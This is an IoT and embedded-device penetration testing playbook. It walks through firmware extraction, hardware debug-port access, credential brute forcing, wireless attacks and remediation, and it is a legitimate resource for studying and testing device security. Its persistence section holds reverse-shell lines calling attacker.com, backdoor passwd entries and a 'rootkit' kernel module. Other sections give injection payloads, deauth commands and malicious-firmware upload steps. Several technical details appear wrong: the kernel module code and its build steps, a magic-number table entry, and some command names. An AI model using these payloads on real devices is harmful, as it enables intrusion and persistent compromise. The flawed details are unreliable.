# IoT & Embedded Systems Penetration Testing Playbook
**Hardware, Firmware, and Protocol Security Assessment** | Last Updated: 2026-03-08

---

## Overview

This playbook provides comprehensive methodology for penetration testing IoT devices and embedded systems. It covers reconnaissance, firmware analysis, hardware exploitation, protocol security, wireless attacks, and persistence mechanisms.

**Key Focus Areas:**
1. Device Enumeration & Reconnaissance
2. Firmware Extraction & Analysis
3. Hardware Hacking (UART, JTAG, SPI, I2C)
4. Default Credentials & Authentication
5. Wireless Protocol Analysis (WiFi, Bluetooth, Zigbee, etc.)
6. Network Protocol Testing
7. Privilege Escalation & Root Access
8. Lateral Movement & Persistence
9. Supply Chain & Software Integrity
10. Secure Boot & Attestation Bypass

**Testing Phases:**
1. Reconnaissance & Information Gathering
2. Network Discovery & Port Mapping
3. Firmware Acquisition & Extraction
4. Firmware Analysis (Static & Dynamic)
5. Hardware Exploitation
6. Wireless Protocol Testing
7. Authentication & Credential Assessment
8. Privilege Escalation
9. Persistence & Backdoor Installation
10. Reporting & Remediation

---

## Phase 0: Prerequisites & Setup

### 0.1 Equipment & Tools
**Hardware Equipment:**
- Raspberry Pi / Single Board Computer (for hacking)
- Bus Pirate / Saleae Logic Analyzer (for protocol analysis)
- UART/Serial adapters (USB to Serial)
- JTAG debugger (Segger J-Link, ARM JTAG)
- Multimeter (voltage measurement)
- Soldering iron & supplies (for internal access)
- RF analyzer / Software Defined Radio (HackRF, USRP)
- WiFi adapter (Alfa, with monitor mode)
- Bluetooth adapter (Ubertooth, nRF52840 Dongle)

**Software Tools:**
- Binwalk (firmware extraction)
- IDA Pro / Ghidra (disassembly)
- Wireshark (packet analysis)
- tcpdump (network capture)
- radare2 / Cutter (reverse engineering)
- Burp Suite (HTTP/HTTPS interception)
- Nmap / Masscan (port scanning)
- Hydra (credential brute force)
- Frida (runtime instrumentation)
- UPX (executable unpacking)
- Yara (malware detection)
- Aircrack-ng (WiFi assessment)
- Bluetooth tools (hciconfig, hcitool)
- GDB / LLDB (debugging)

### 0.2 Testing Scope & Authorization
**Checklist:**
- [ ] Written authorization to test device
- [ ] Scope clearly defined (which devices, features, networks)
- [ ] Testing timeline and windows defined
- [ ] Data handling procedures established
- [ ] Escalation contacts identified
- [ ] Rules of engagement agreed
- [ ] Safety considerations documented (power, heat, damage)
- [ ] Network isolation plan (if needed)
- [ ] Liability agreement signed
- [ ] Incident response plan in place

### 0.3 Lab Setup
**Safe Testing Environment:**
```bash
# Isolated network
# - Separate physical network or VLAN
# - No internet access to IoT devices
# - Air-gapped if testing is high-risk

# Monitoring & logging
# - Packet capture on all traffic
# - Serial console logging
# - System logs backup
# - Timestamped documentation

# Power management
# - UPS for stability
# - Power supply matching device specs
# - Circuit breaker for safety

# Data isolation
# - No production data on test devices
# - Separate test accounts
# - No personal information
```

---

## Phase 1: Reconnaissance & Device Information Gathering

### 1.1 Device Identification & Documentation
**Objective:** Gather all available information about target device

**Physical Inspection:**
```
Device: [Name/Model]
Manufacturer: [Company]
Model Number: [Number]
Serial Number: [Number]
Firmware Version: [Version]
Hardware Revision: [Number]

Physical Ports:
- USB: [Type/Version]
- Ethernet: [Type]
- Serial/UART: [Present/Not visible]
- JTAG: [Header present]
- SPI: [Present]
- GPIO: [Present]
- Power: [Specifications]

Physical Labels:
- QR codes
- Batch numbers
- Test points (TP1, TP2, etc.)
- Component markings
- Revision markers

Housing:
- Sealed vs. openable
- Glue/screws
- Sticker covering screws
- Tamper evident seals
```

### 1.2 Network Reconnaissance
**Objective:** Discover device on network and identify services

**Checklist:**
- [ ] Device IP address assignment (DHCP/Static)
- [ ] MAC address identification
- [ ] Open ports and services
- [ ] Device hostname/mDNS
- [ ] HTTP/HTTPS interfaces
- [ ] SSH/Telnet access
- [ ] SNMP service
- [ ] NTP service
- [ ] UPnP/SSDP advertised services
- [ ] Wireless networks
- [ ] Bluetooth presence

**Commands:**
```bash
# Network scanning
nmap -sV -p- <device-ip>

# Service identification
nmap -sV -Pn <device-ip>

# OS fingerprinting
nmap -O <device-ip>

# Service version detection
curl -I http://<device-ip>/

# SNMP enumeration
snmpwalk -c public <device-ip>

# UPnP discovery
upnp-inspector

# mDNS discovery
avahi-browse -a
```

### 1.3 Web Interface Assessment
**Objective:** Identify and analyze web-based management interfaces

**Checklist:**
- [ ] HTTP on port 80
- [ ] HTTPS on port 443
- [ ] Other HTTP ports (8080, 8000, 8888, etc.)
- [ ] SSL/TLS certificate info
- [ ] Server software identification
- [ ] Web server version
- [ ] Technology stack
- [ ] Default credentials
- [ ] API endpoints
- [ ] Authentication mechanism

**Testing:**
```bash
# Web server identification
curl -I http://<device-ip>

# Service version
curl -I http://<device-ip>:8080

# SSL info
openssl s_client -connect <device-ip>:443

# Web scanning
nikto -h http://<device-ip>

# Enumerate directories
gobuster dir -u http://<device-ip> -w wordlist.txt
```

---

## Phase 2: Firmware Acquisition & Extraction

### 2.1 Firmware Download & Extraction
**Objective:** Obtain firmware for analysis

**Methods (in order of ease):**

**Method 1: Download from Manufacturer**
```bash
# Check manufacturer website
# Look for firmware/software downloads
# Often available for public download

# Extract if compressed
unzip firmware.zip
tar -xvf firmware.tar.gz
```

**Method 2: Extract from Updating Device**
```bash
# Intercept firmware update
# Monitor network traffic during update
tcpdump -i eth0 -w firmware-update.pcap

# Extract from HTTP request
strings firmware-update.pcap | grep -E "firmware|bin|img"

# Or use Burp Suite to capture update
# Burp Suite → Proxy → Traffic → Firmware update → Export
```

**Method 3: Extract from Device via UART**
```bash
# Connect UART adapter to device
# Device TX → Adapter RX
# Device RX → Adapter TX
# Device GND → Adapter GND

# Open serial connection
picocom /dev/ttyUSB0 -b 115200

# Dump firmware from shell
cat /dev/mtd0 > firmware.bin  # MTD (Memory Technology Device)

# Or copy via SCP/SFTP
scp root@<device-ip>:/firmware/* .
```

**Method 4: Extract via JTAG/SPI**
```bash
# Connect JTAG debugger (Segger J-Link)
# Or JTAG adapter (UM232H, BusBlaster)

# Using OpenOCD
openocd -f interface/ftdi/um232h.cfg -f target/stm32f1x.cfg

# Dump memory
mdw 0x08000000 0x10000  # Read word

# Or use chip-specific tools
stm32flash -r firmware.bin /dev/ttyUSB0
```

**Method 5: Desoldering Flash Chip**
```
1. Identify flash chip (marking on top)
2. Desolder using heat gun or solder sucker
3. Read using flash programmer:
   - CH341A programmer
   - Raspberry Pi with bit-bang
   - Segger J-Link
4. Reassemble device
```

### 2.2 Firmware Format Identification
**Objective:** Understand firmware structure

**Commands:**
```bash
# Identify file type
file firmware.bin

# Hex dump beginning
xxd firmware.bin | head -20

# Magic numbers
hexdump -C firmware.bin | head -10

# Search for known signatures
strings firmware.bin | head -20

# Use binwalk
binwalk firmware.bin
binwalk -e firmware.bin  # Extract automatically
```

**Common Firmware Formats:**
```
Magic Bytes → Format
------------------------------------------
0x89 0x50 0x4E 0x47 → PNG image
0xFF 0xD8 0xFF 0xE0 → JPEG image
0x7F 0x45 0x4C 0x46 → ELF binary
0x4D 0x5A 0x90 0x00 → Windows PE
0x1F 0x8B 0x08 0x00 → GZIP compressed
0x50 0x4B 0x03 0x04 → ZIP archive
0x27 0x05 0x19 0x56 → uImage
0xDE 0xAD 0xBE 0xEF → OpenWrt
```

### 2.3 Firmware Extraction & Unpacking
**Objective:** Extract filesystems and components

**Using Binwalk:**
```bash
# Extract automatically
binwalk -e firmware.bin

# Extract specific type
binwalk -e firmware.bin --signature

# Extract with format
binwalk -e firmware.bin --directory=./extracted
```

**Manual Extraction:**
```bash
# If Binwalk doesn't work, try manual approach
# Find filesystem offset
strings firmware.bin | grep "squashfs\|jffs2\|ubifs"

# Calculate hex offset
# Extract with dd
dd if=firmware.bin of=filesystem.img bs=1 skip=0x12345

# Mount filesystem
mkdir mount
sudo mount -o loop filesystem.img mount/
ls -la mount/
```

**Common Filesystems:**
```bash
# Mount squashfs
sudo mount -t squashfs filesystem.img mount/

# Mount JFFS2
sudo modprobe mtdram total_size=512000
sudo modprobe mtdblock
mount -t jffs2 /dev/mtdblock0 mount/

# Mount UBI
ubirestore firmware.bin
mount -t ubifs ubi0 mount/
```

---

## Phase 3: Firmware Analysis

### 3.1 Static Analysis
**Objective:** Analyze firmware without executing

**Checklist:**
- [ ] Identify CPU architecture
- [ ] Identify operating system
- [ ] Identify standard libraries
- [ ] Identify custom applications
- [ ] Identify hardcoded strings
- [ ] Identify credentials
- [ ] Identify private keys
- [ ] Identify cryptographic operations
- [ ] Identify dangerous functions
- [ ] Identify vulnerable libraries

**Commands:**
```bash
# Identify architecture
file extracted/bin/init
file extracted/bin/*

# Extract strings
strings extracted/bin/main | grep -i password
strings extracted/bin/main | grep -i key
strings extracted/bin/main | grep -i secret

# Search for credentials
grep -r "password\|username\|credential" extracted/etc/
grep -r "api_key\|api_secret\|token" extracted/

# Search for IP addresses
strings extracted/bin/* | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Search for URLs
strings extracted/bin/* | grep "http\|ftp"

# Private key search
grep -r "BEGIN RSA\|BEGIN PRIVATE" extracted/

# Hardcoded WiFi credentials
grep -r "ssid\|wifi\|ap_name" extracted/ | grep -v ".so"
```

### 3.2 Dynamic Analysis
**Objective:** Analyze firmware during execution

**Emulation:**
```bash
# Extract filesystem
binwalk -e firmware.bin

# Attempt to boot in emulator
qemu-system-arm -M <board> -kernel extracted/boot/zImage -initrd extracted/rootfs.cpio

# With network
qemu-system-arm -M vexpress-a9 -kernel zImage -drive file=rootfs.ext2,if=sd,format=raw -append "root=/dev/mmcblk0" -netdev user,id=mynet -device virtio-net-device,netdev=mynet

# Check what processes are running
ps aux
```

**Serial Console Access (Real Device):**
```bash
# Connect UART and open serial connection
picocom /dev/ttyUSB0 -b 115200

# Monitor boot sequence
# Look for information leakage

# Access shell
# Try default credentials
root / (no password)
admin / admin
admin / password

# Explore system
ls -la
cat /etc/passwd
cat /etc/shadow
ifconfig
ps aux
```

### 3.3 Vulnerable Library Detection
**Objective:** Identify known vulnerable libraries

**Commands:**
```bash
# List libraries
ldd extracted/bin/main

# Extract library versions
strings extracted/lib/* | grep -E "version|VERSION"

# Common vulnerable libraries
# - OpenSSL < 1.0.2
# - OpenSSH < 6.0
# - BusyBox < 1.20
# - uClibc < 0.9.33

# Use automated tools
checksec extracted/bin/*

# NVD vulnerability check
# Cross-reference library versions with CVE databases
```

### 3.4 Reverse Engineering Key Functions
**Objective:** Understand critical functionality

**Using Ghidra (Free):**
```bash
# Launch Ghidra
ghidra

# Import binary
File → Import File → extracted/bin/main

# Analyze
Analysis → Auto-Analyze

# Search for functions
Search → Program Text → Find

# Look for:
# - Authentication functions
# - Encryption/decryption
# - Network communication
# - Command execution
# - File operations
```

**Using IDA Pro (Commercial but powerful):**
```bash
# Open binary
File → Open → extracted/bin/main

# Auto-analysis runs
# Navigate code
# Look for suspicious calls
```

---

## Phase 4: Hardware Exploitation

### 4.1 UART Serial Access
**Objective:** Gain console access via UART

**Hardware Connection:**
```
Device UART → USB Adapter:
TX (Pin 1) → RX (Green)
RX (Pin 2) → TX (White)
GND (Pin 3) → GND (Black)
VCC (Pin 4) → +3.3V (Red) [Optional, check device]

Note: Voltage levels must match (3.3V or 5V)
```

**Establishing Connection:**
```bash
# Identify port
ls /dev/tty*

# Open serial connection
picocom /dev/ttyUSB0 -b 115200

# Try common baudrates if no output: 9600, 38400, 57600

# Alternative tools
cu -l /dev/ttyUSB0 -s 115200
screen /dev/ttyUSB0 115200
```

**Exploitation:**
```bash
# Boot interrupt (Ctrl+C during boot)
# Often drops to bootloader shell

# Default credentials
root / (blank)
admin / admin
admin / password

# No authentication (many IoT devices)
# Direct access to shell

# Dump files
cat /etc/passwd
cat /etc/shadow  # If readable
cat /proc/version

# Escalate if needed
su root
sudo su
```

### 4.2 JTAG Debugging
**Objective:** Access chip via JTAG interface

**Hardware Setup:**
```
JTAG Signals:
TCK  (Test Clock)
TDI  (Test Data In)
TDO  (Test Data Out)
TMS  (Test Mode Select)
GND  (Ground)

Common 20-pin JTAG pinout:
Pin 1: TCO (not used usually)
Pin 2: GND
Pin 3: TDO
Pin 4: GND
Pin 5: TMS
...
```

**Finding JTAG Header:**
```
1. Look for 6-pin or 20-pin header
2. Labels: TCK, TDI, TDO, TMS, GND
3. May be labeled: "JTAG", "DEBUG", "J1", etc.
4. Test points (TP) with names

Common locations: near CPU, on edge of board
```

**Using OpenOCD:**
```bash
# Connect debugger (Segger J-Link, Altera USB Blaster, etc.)

# Create OpenOCD config
cat > openocd.cfg << EOF
interface ftdi
ftdi_device_desc "UM232H"
ftdi_vid_pid 0x0403 0x6014
ftdi_channel 0

transport select jtag
adapter_khz 1000

source [find target/stm32f1x.cfg]
EOF

# Start OpenOCD
openocd -f openocd.cfg

# In another terminal, connect via GDB
gdb
(gdb) target remote localhost:3333
(gdb) monitor reset halt
(gdb) dump memory firmware.bin 0x08000000 0x0807FFFF
```

### 4.3 SPI Flash Extraction
**Objective:** Read/write SPI flash memory

**Hardware Identification:**
```
SPI Flash characteristics:
- 8-pin DIP or BGA package
- Model: Winbond W25Q64, Micron MT25QL128, etc.
- Markings on top
```

**SPI Pinout (Standard):**
```
Pin 1: CS  (Chip Select)
Pin 2: DO  (Data Out / MISO)
Pin 3: VSS (Ground)
Pin 4: VCC (Power)
Pin 5: CLK (Clock)
Pin 6: DI  (Data In / MOSI)
Pin 7: WP  (Write Protect)
Pin 8: HOLD (Hold)
```

**Reading SPI Flash:**
```bash
# Using CH341A programmer + software
# 1. Desolder chip (carefully with heat gun)
# 2. Install in programmer
# 3. Run software on PC
# 4. Dump memory

# Or use Raspberry Pi + flashrom
# GPIO pins as SPI
gpio mode 8 out; gpio mode 9 in; gpio mode 11 out; gpio mode 7 out

flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin

# Analyze firmware offline
binwalk -e firmware.bin
```

### 4.4 I2C Probing
**Objective:** Discover and communicate with I2C devices

**I2C Standard Signals:**
```
SDA (Serial Data)
SCL (Serial Clock)
GND (Ground)

Common I2C devices:
- EEPROM
- Real-time clock (RTC)
- Temperature sensors
- Accelerometers
- FPGA configuration
```

**Probing:**
```bash
# Using I2C adapter (USB or CH341A)
i2cdetect -y 0  # List all I2C addresses

# Dump EEPROM (typical 0x50 address)
i2cdump -y -r 0x00-0xFF 0 0x50

# Read specific address
i2cget -y 0 0x50 0x00

# Write to device
i2cset -y 0 0x50 0x00 0xFF
```

**Exploitation:**
```bash
# Modify EEPROM configuration
# Read → Modify → Write back

# Example: Change device ID
i2cdump -y 0 0x50 > original.bin
# Modify original.bin
i2cset -y 0 0x50 [address] [value]

# Reboot to load modified config
```

---

## Phase 5: Default Credentials & Authentication

### 5.1 Default Credentials Testing
**Objective:** Identify and exploit default credentials

**Common Defaults:**
```
Manufacturer   Username    Password
-----------------------------------------------
Linksys        admin       admin
D-Link         admin       (blank)
TP-Link        admin       admin
Netgear        admin       password
DLink          root        (blank)
Belkin         (blank)     (blank)
Ubiquiti       ubnt        ubnt
Mikrotik       admin       (blank)
Hikvision      admin       12345
Dahua          admin       admin
Huawei         root        admin
ZTE            admin       admin
Ericsson       root        root
Cisco          cisco       cisco
```

**Testing:**
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://<device-ip>

# HTTP brute force
hydra -l admin -P passwords.txt http-post-form://<device-ip>/login:user=^USER^&pass=^PASS^ -e nsr

# Telnet (if available)
telnet <device-ip>
# Try defaults at prompt
```

### 5.2 Authentication Bypass
**Objective:** Bypass authentication mechanisms

**Common Bypasses:**
```
1. SQL Injection
   admin' OR '1'='1
   admin' --
   
2. Command Injection
   ; cat /etc/passwd
   | id
   
3. Path Traversal
   ../../etc/passwd
   
4. Default debug credentials
   factory / factory
   
5. Authentication header manipulation
   Authorization: Bearer invalid
   
6. Session fixation
   Set own session cookie
   
7. Credential reset
   Forgot password → Security question with guessable answers
```

**Testing:**
```bash
# Check for SQL injection
curl "http://<device-ip>/login?user=admin' OR '1'='1&pass=*"

# Try bypass payloads
curl "http://<device-ip>/admin.html" -H "X-Bypass-Auth: true"

# Check for authentication headers
# Intercept in Burp, remove Auth header, retry
```

---

## Phase 6: Wireless Protocol Analysis

### 6.1 WiFi Security Assessment
**Objective:** Test wireless network security

**Checklist:**
- [ ] SSID broadcast (hidden vs. visible)
- [ ] Encryption type (WEP, WPA, WPA2, WPA3)
- [ ] Encryption strength
- [ ] Default WiFi credentials
- [ ] WiFi MAC filtering
- [ ] Channel analysis
- [ ] Signal strength
- [ ] Deauthentication attacks
- [ ] Evil twin possibility
- [ ] WPS enabled/disabled

**Tools & Testing:**
```bash
# Scan WiFi networks
nmcli device wifi list
iwlist scan

# Monitor mode
sudo airmon-ng start wlan0
sudo iwconfig wlan0 mode Monitor

# Packet capture
tcpdump -i wlan0mon -w capture.pcap

# WiFi password cracking (if WPA2/WPA3)
aircrack-ng -w wordlist.txt capture.pcap

# Check for WPS
wash -i wlan0mon

# Deauth attack (test recovery)
aireplay-ng --deauth 10 -a <target-mac> wlan0mon
```

### 6.2 Bluetooth Security
**Objective:** Test Bluetooth connectivity

**Checklist:**
- [ ] Bluetooth version (Classic vs. BLE)
- [ ] Bluetooth visibility (discoverable/connectable)
- [ ] Pairing mechanism
- [ ] Encryption enabled
- [ ] Authentication level
- [ ] GATT services exposed (BLE)
- [ ] Default Bluetooth PINs
- [ ] Bluetooth MAC randomization
- [ ] Vulnerability to known attacks

**Testing:**
```bash
# Scan for Bluetooth devices
hcitool scan
bluetoothctl scan on

# Pair with device
hcitool cc <device-mac>
echo PIN:1234 | bluez-simple-agent <adapter> <device-mac>

# List GATT services (BLE)
gatttool -b <device-mac> --interactive
> connect
> primary
> char-read-uuid <uuid>

# Bluetooth MITM (with mitm-proxy)
btproxy --capture <capture-file> <target-device>

# Replay attacks
# Capture BLE traffic, replay commands
```

### 6.3 Zigbee/Z-Wave Assessment
**Objective:** Test smart home protocols

**Zigbee Security:**
```bash
# Scan for Zigbee networks
# Using Zigbee sniffer (Wireshark plugin)

# Default keys
Link Key: 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39
Network Key: (varies, usually transmitted in clear)

# Capture and decrypt traffic
# KillerBee tools
zbdump -o capture.pcap
```

**Z-Wave Security:**
```bash
# Z-Wave operates on 908.42 MHz
# Sniffer: Z-Wave 700 series

# Capture traffic
# Analyze frequency, commands, encryption

# Default: No encryption at pairing (security depends on implementation)
```

---

## Phase 7: Network Protocol Testing

### 7.1 Network Service Enumeration
**Objective:** Identify and test network services

**Services to Test:**
```
- HTTP/HTTPS web interface
- SSH (port 22)
- Telnet (port 23)
- SNMP (port 161)
- DNS (port 53)
- UPnP (port 1900)
- Modbus (port 502)
- MQTT (port 1883/8883)
- CoAP (port 5683)
```

**Commands:**
```bash
# Full port scan
nmap -sV -p- <device-ip>

# Service version detection
nmap -sV -p 22,80,443,1883 <device-ip>

# Service enumeration
nmap -sC <device-ip>  # Run default scripts

# Identify specific services
bannergrabbingcurl <device-ip>:22
```

### 7.2 MQTT Protocol Testing
**Objective:** Test MQTT broker security

**MQTT Checklist:**
- [ ] Authentication required
- [ ] Default credentials (anonymous)
- [ ] Encryption (TLS)
- [ ] Topic access control
- [ ] Payload encryption
- [ ] Message retention

**Testing:**
```bash
# Connect as anonymous
mosquitto_sub -h <device-ip> -t "#" -v

# Publish commands
mosquitto_pub -h <device-ip> -t "command" -m "reboot"

# Brute force credentials
hydra -l admin -P wordlist.txt mqtt://<device-ip>
```

### 7.3 HTTP API Testing
**Objective:** Test HTTP/HTTPS APIs (similar to web app testing)

**See Webapp Pentesting Playbook for detailed API testing**

Basic checks:
```bash
# Identify endpoints
curl -X OPTIONS http://<device-ip>/api/ -v

# Test for auth bypass
curl http://<device-ip>/api/admin

# Inject commands
curl "http://<device-ip>/api/execute?cmd=id"

# Parameter tampering
# Modify device ID, user ID, etc.
```

---

## Phase 8: Privilege Escalation & Root Access

### 8.1 Linux Privilege Escalation
**Objective:** Escalate from user to root

**Enumeration:**
```bash
# Check current user
whoami
id

# Check sudoers
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Kernel version
uname -a

# Check for vulnerable services
ps aux

# Cron jobs
crontab -l
```

**Exploitation:**
```bash
# SUID exploit example
# If binary has SUID and vulnerability:
# /usr/bin/vulnerable_binary
strings vulnerable_binary | grep -i /bin/sh
# If it calls system() with relative path, can hijack

# Create payload
echo '#!/bin/sh' > cat
echo '/bin/bash' >> cat
chmod +x cat
export PATH=.:$PATH
./vulnerable_binary  # Executes our 'cat'
```

### 8.2 Bootloader Access
**Objective:** Modify bootloader for code execution

**U-Boot (Common bootloader):**
```
1. Interrupt boot (usually Ctrl+C during boot)
2. Access U-Boot CLI
3. Set bootargs to drop to shell
4. Boot into root shell

Example:
setenv bootargs console=ttyS0,115200 init=/bin/sh
boot

5. Modify /etc/fstab, /etc/shadow
6. Reboot normally
```

**Exploit Possibilities:**
```
- Modify kernel parameters
- Load custom kernel
- Skip authentication
- Modify file permissions
- Add backdoor user
```

---

## Phase 9: Persistence & Backdoors

### 9.1 Persistent Root Shell
**Objective:** Maintain access after device reboot

**Methods:**

**Add Backdoor User:**
```bash
# Via serial console or sudo
# Edit /etc/passwd directly or
useradd -m -s /bin/bash -G sudo backdoor
passwd backdoor  # Set password

# Or directly edit
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd
```

**Modify Startup Scripts:**
```bash
# Add to /etc/rc.local or /etc/init.d/
cat >> /etc/rc.local << 'EOF'
# Reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
# Or
nc -e /bin/bash attacker.com 4444 &
EOF
```

**Firmware Modification:**
```bash
# Extract firmware
binwalk -e firmware.bin

# Modify files
# Add backdoor user
echo "backdoor::0:0::/root:/bin/sh" >> extracted/etc/passwd

# Repackage
# Create new filesystem image
mkfs.squashfs extracted/ filesystem.img

# Combine with other parts
# Write back to flash via JTAG/serial/web interface
```

### 9.2 Kernel Module Backdoor
**Objective:** Load rootkit as kernel module

**Creation (Advanced):**
```c
// backdoor.c - Minimal kernel module
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>

static int __init backdoor_init(void) {
    // Escalate current process to root
    current->uid = 0;
    current->euid = 0;
    current->gid = 0;
    current->egid = 0;
    printk(KERN_INFO "Backdoor loaded\n");
    return 0;
}

module_init(backdoor_init);
MODULE_LICENSE("GPL");
```

**Installation:**
```bash
# Compile for target kernel
gcc -c backdoor.c -o backdoor.o

# Insert module
insmod backdoor.o

# Or hide module
echo "backdoor" >> /etc/modprobe.blacklist

# Verify root access
whoami  # Should show root
```

---

## Phase 10: Supply Chain & Integrity Assessment

### 10.1 Firmware Signing & Verification
**Objective:** Test firmware update security

**Checklist:**
- [ ] Firmware update mechanism
- [ ] Signature verification
- [ ] Certificate pinning
- [ ] Rollback protection
- [ ] Update channel security (HTTPS)
- [ ] Downgrade to vulnerable version possible
- [ ] Unsigned firmware accepted
- [ ] Plaintext update possible

**Testing:**
```bash
# Obtain legitimate firmware update
# Try to modify and re-upload

# Create malicious firmware
# Add backdoor to legitimate firmware
binwalk -e firmware.bin
# Modify extracted/bin/init to add backdoor
# Repackage

# Attempt upload
curl -X POST --form "firmware=@malicious.bin" http://<device-ip>/upload
```

### 10.2 Secure Boot Bypass
**Objective:** Test secure boot implementation

**Common Bypasses:**
```
1. Debug interface enabled
   - JTAG not properly locked
   - Serial console not restricted
   
2. Key extraction
   - Hardcoded keys in firmware
   - Extractable via side-channel
   
3. Bootloader vulnerability
   - Buffer overflow in bootloader
   - Command injection
   
4. Signature verification bypass
   - Integer overflow
   - NULL pointer dereference
```

**Testing:**
```bash
# Check for debug interface
# JTAG, serial console, SPI availability

# Extract keys from firmware
strings firmware.bin | grep -i "key\|certificate"

# Attempt malicious firmware
# Try with invalid signature
# Try with zeroed signature
# Try with extracted key
```

---

## Phase 11: Exploitation & Impact

### 11.1 Remote Code Execution Scenarios
**Objective:** Demonstrate impact

**Example Scenarios:**
```
1. Command Injection in Web Interface
   curl "http://<device>/execute?cmd=reboot"
   → Device reboots without authorization
   
2. Firmware Update Abuse
   Upload malicious firmware
   → Device becomes infected, joins botnet
   
3. Credential Theft via MQTT
   Subscribe to all topics
   → Capture sensor data, user commands
   
4. Lateral Movement via WiFi
   Compromise WiFi password
   → Access internal network
```

### 11.2 Denial of Service
**Objective:** Demonstrate availability impact

**DoS Vectors:**
```
1. Resource exhaustion
   - Fill storage
   - Exhaust memory
   - Max out CPU
   
2. Service crash
   - Send malformed packets
   - Exploit buffer overflow
   - Trigger exception
   
3. Reboot loop
   - Modify bootloader
   - Corrupt filesystem
```

---

## Phase 12: Reporting & Remediation

### Vulnerability Prioritization
```
CRITICAL:
- RCE via web interface
- Default credentials leading to root
- Unauthenticated MQTT control
- Firmware without signature verification

HIGH:
- Hardcoded credentials
- Weak encryption
- UART access without authentication
- Privilege escalation
- Lateral movement via compromised device

MEDIUM:
- Information disclosure
- Weak WiFi security
- Missing security headers
- Insecure update mechanism

LOW:
- Verbose error messages
- Unnecessary services
- Deprecated protocols
```

### Remediation Recommendations
```
1. Secure Boot Implementation
   - Verify firmware signatures
   - Implement secure bootloader
   - Prevent downgrade attacks
   
2. Secure Development
   - Code review for injection vulnerabilities
   - Static analysis of firmware
   - Remove hardcoded credentials
   
3. Operational Security
   - Change default credentials
   - Disable unnecessary services
   - Implement access controls
   - Encrypt sensitive data
   
4. Patch Management
   - Regular security updates
   - Signed updates
   - Over-The-Air (OTA) capability
   
5. Monitoring
   - Enable logging
   - Monitor for suspicious activity
   - Alert on privilege escalation
   
6. Hardware Security
   - Secure UART/JTAG access
   - Fuse sensitive settings
   - Enable write protection on flash
```

---

## Tools Summary

**Firmware Analysis:**
- Binwalk, IDA Pro, Ghidra, radare2

**Hardware Access:**
- Bus Pirate, Saleae Logic Analyzer, JTAG debugger

**Protocol Analysis:**
- Wireshark, tcpdump, Burp Suite

**Network Testing:**
- Nmap, Hydra, Nikto

**Wireless:**
- Aircrack-ng, Bluetooth tools, SDR tools (HackRF, USRP)

**Exploitation:**
- Metasploit, custom scripts, public exploits

**General Utilities:**
- GDB, strings, strace, ltrace

---

**Last Updated:** 2026-03-08
**Version:** 1.0
